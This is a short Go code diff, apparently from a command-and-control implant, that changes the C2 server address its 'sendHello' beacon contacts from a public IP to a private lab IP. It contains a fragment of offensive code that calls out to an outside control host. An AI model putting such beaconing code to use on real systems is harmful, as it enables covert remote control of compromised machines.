@@ -87,7 +87,8 @@ func main() {
 
 	// Start hello timer
 	// Set the below IP to the IP of the C2
-	go sendHello(iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
+	// 192.168.4.6
+	go sendHello(iface, src, net.IPv4(192, 168, 4, 6), dstMAC)
 
 	// Listen for responses
 	fmt.Println("[+] Listening")
